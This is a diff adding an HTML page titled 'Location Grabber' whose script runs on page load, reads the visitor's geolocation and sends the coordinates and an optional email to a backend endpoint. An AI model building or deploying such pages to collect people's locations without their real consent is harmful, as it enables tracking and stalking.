@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Grabber</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .loading {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📍 Location Grabber</h1>
+        <p>Your location is being captured...</p>
+        
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Enter your email (optional)">
+        </div>
+
+        <div id="status" class="loading">📍 Capturing location...</div>
+    </div>
+
+    <script>
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = type;
+            status.style.display = 'block';
+        }
+
+        function captureLocation() {
+            const email = document.getElementById('email').value || 'anonymous';
+
+            showStatus('📍 Capturing location...', 'loading');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        console.log('Location:', { lat, lon, accuracy, email });
+
+                        // Send to backend
+                        fetch(`/api/location?lat=${lat}&lon=${lon}&accuracy=${accuracy}&email=${email}`)
+                            .then(res => res.json())
+                            .then(data => {
+                                console.log('Response:', data);
+                                showStatus(`✅ Location Captured!\nLat: ${lat.toFixed(4)}\nLon: ${lon.toFixed(4)}`, 'success');
+                            })
+                            .catch(err => {
+                                console.error('Error:', err);
+                                showStatus(`❌ Error: ${err.message}`, 'error');
+                            });
+                    },
+                    function(error) {
+                        console.error('Geolocation error:', error);
+                        showStatus('❌ Location permission denied or unavailable', 'error');
+                    }
+                );
+            } else {
+                showStatus('❌ Geolocation not supported', 'error');
+            }
+        }
+
+        // AUTO-CAPTURE on page load
+        window.addEventListener('load', captureLocation);
+    </script>
+</body>
+</html>
